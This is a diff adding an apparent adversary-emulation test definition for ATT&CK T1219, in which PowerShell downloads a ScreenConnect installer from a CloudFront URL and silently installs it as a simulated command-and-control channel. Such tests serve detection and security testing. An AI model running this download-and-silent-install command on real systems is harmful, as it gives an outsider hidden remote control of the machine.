@@ -1,0 +1,25 @@
+- description: 'An adversary may attempt to trick the user into downloading ScreenConnect
+    for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads
+    directory.
+
+    Msiexec will be used to quietly insall ScreenConnect.
+
+    '
+  id: 9332aff267b00ede37b09606340ee1dc
+  name: ScreenConnect Application Download and Install on Windows
+  platforms:
+    windows:
+      psh:
+        cleanup: $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi";
+          msiexec /x $installer /qn
+        command: $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi";
+          Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi";
+          msiexec /i $installer /qn
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
